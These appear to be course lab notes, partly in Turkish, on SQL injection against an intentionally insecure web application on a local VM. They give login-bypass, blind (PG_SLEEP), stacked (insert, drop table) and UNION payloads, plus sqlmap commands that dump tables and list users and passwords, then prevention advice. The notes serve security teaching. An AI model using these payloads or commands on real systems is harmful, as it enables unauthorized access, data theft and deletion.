
## Security Testing (OWASP ZAP  Getting Started Guide)

<https://github.com/zaproxy/zaproxy/wiki/Downloads>

ZAP active scan

## SQL Injection
https://github.com/celalceken/InsecureWebApplicationProject

Switch to 1.2.0 SQL Injection

Bypassing Login Screens

Payload: A2' or '1'='1';--
Payload: A2' or '1';--
Payload: A1';--

Payload: admin'#  // (switch to mysql)


### Blind SQL Injection 

<https://www.owasp.org/index.php/Blind_SQL_Injection>

Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer 
based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated 
the code that is vulnerable to SQL injection.

When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query's syntax 
is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. 
When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. 
This makes exploiting the SQL Injection vulnerability more difficult, but not impossible.

Switch to 1.2.0 SQL Injection

In the Login Page

Payload: asdf' AND 3930=(SELECT 3930 FROM PG_SLEEP(5)) AND 'gRqx'='gRqx


### Stacked SQL Injection
Prepared statements are preveting multiple query execution //﻿"cannot insert multiple commands into a prepared statement"



http://192.168.56.103/SecureSoftwareDevelopment/Lecture3WebApplicationArchitecture/1Examples/8JSONPHP.php

Payload: '; insert into table1 values( 5, 'toX', 'toY', 4 );--

Payload: ';drop table "table2"; --

### Union Injections 
Basically you can poison query to return records from another table.

http://192.168.56.103/SecureSoftwareDevelopment/Lecture3WebApplicationArchitecture/1Examples/8JSONPHP.php

A' UNION select adi, soyadi from "AkademikPersonel";--

### sqlmap

Switch to 1.3.1 Switch to MySQL DB -> SQL Injection


sqlmap hakkında ayrıntılı bilgi için : <https://github.com/sqlmapproject/sqlmap/wiki/Usage>


sqlmap -u "http://192.168.56.103/InsecureWebApplicationProject/Dogrula.php" --data "personelNo=a&sifre=a" --dbs --level=5 --risk=3 --flush-session
sqlmap -u "http://192.168.56.103/InsecureWebApplicationProject/Dogrula.php" --data "personelNo=a&sifre=a" -D obs --tables
sqlmap -u "http://192.168.56.103/InsecureWebApplicationProject/Dogrula.php" --data "personelNo=a&sifre=a" -D obs -T AkademikPersonel --dump

--flush-session parametresi ile yeni oturum (yeni tarama) açılır...


> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f (fingerprint) vt sürümü
root@kali:~# sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f

> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" --current-user

--hostname, --current-db, --users, --passwords, --privileges, --roles


## SQL Injection Prevention

https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet

a. Input filtering
    if ($userSession->login(filter_var($_POST['personelNo'], FILTER_SANITIZE_STRING), $_POST['sifre'], FILTER_SANITIZE_STRING))

b. Query Parameterization:
    In order to mitigate SQL injection, untrusted input should be prevented from being interpreted as part of a SQL command.
    The best way to do this is with the programming technique known as ‘Query Parameterization’. In this case, the SQL statements
    are sent to and parsed by the database server separately from any parameters.

c. Prepared statement

d. Stored Procedures

e. Encoding

